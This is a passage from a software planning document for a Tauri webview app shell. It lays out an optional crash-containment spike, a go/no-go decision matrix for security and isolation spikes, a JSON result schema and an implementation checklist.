## Spike 0.7: Crash Containment (Optional)

### Question Being Answered

If an app webview crashes or hangs, does the shell remain responsive? Can we recover?

### Why Critical (but Optional)

Process isolation means:
- One app crash shouldn't take down all apps
- Shell can detect and recover from app failures
- Better user experience

This is **desirable but not blocking**.

### Pass Criteria

```json
{
  "spike": "0.7",
  "pass_criteria": {
    "shell_survives_crash": {
      "condition": "shell remains responsive after webview crash",
      "required": false
    },
    "can_recover": {
      "condition": "can create new webview after crash",
      "required": false
    }
  },
  "note": "This spike is optional - informs but doesn't block"
}
```

### Fail Path

If crash containment doesn't work:
- Document behavior per platform
- Consider iframe fallback for crash isolation
- Accept risk and document in system requirements

---

## Go/No-Go Decision Matrix

| Spike | If PASS | If FAIL |
|-------|---------|---------|
| **0.1 Secure Context** | Continue to 0.2, 0.3 | **STOP** - Find alternative scheme |
| **0.2 Origin Isolation** | Continue | Implement SDK-level storage partitioning |
| **0.3 CSP Enforcement** | Continue to 0.4 | **CRITICAL** - Try meta tag CSP |
| **0.4 Sandbox Containment** | Continue | **STOP** - Architecture not viable |
| **0.5 IPC Feasibility** | Use MessagePort or Rust-mediated | Use Rust-mediated (expected) |
| **0.6 Memory Baseline** | Document numbers | Adjust LRU policy, document limits |
| **0.7 Crash Containment** | Nice to have | Document behavior |

### Critical Path

```
0.1 (Secure Context) ──► 0.3 (CSP) ──► 0.4 (Containment)
         │                                    │
         │                                    ▼
         └──► 0.2 (Origin) ──────────────► GO/NO-GO
```

If Spikes 0.1, 0.3, and 0.4 all pass: **GREEN LIGHT** for full implementation.

---

## Output Artifacts

Each spike produces:

1. **JSON Result File**: `spikes/results/spike-{N}-{platform}-{timestamp}.json`
2. **Summary Report**: `spikes/SPIKE_SUMMARY.md` (auto-generated)
3. **Platform Matrix**: `spikes/PLATFORM_MATRIX.md`

### Result Schema

```json
{
  "spike_id": "0.1",
  "spike_name": "secure_context",
  "platform": {
    "os": "macos",
    "os_version": "14.2",
    "webview_engine": "WKWebView",
    "webview_version": "18616",
    "tauri_version": "2.0.0"
  },
  "timestamp": "2026-01-20T12:00:00Z",
  "duration_ms": 5234,
  "passed": true,
  "required_passed": 8,
  "required_total": 8,
  "probes": { ... },
  "fail_reasons": null
}
```

---

## Implementation Checklist

- [ ] Create `spikes/` directory structure
- [ ] Implement Spike 0.1 harness
- [ ] Run Spike 0.1 on all platforms
- [ ] Implement Spike 0.2 harness (if 0.1 passes)
- [ ] Implement Spike 0.3 harness
- [ ] Implement Spike 0.4 harness
- [ ] Implement Spike 0.5 harness
- [ ] Implement Spike 0.6 harness
- [ ] (Optional) Implement Spike 0.7 harness
- [ ] Generate summary report
- [ ] Make go/no-go decision
- [ ] Document any platform-specific findings
- [ ] Update RISK_REGISTER.md with retired/new risks
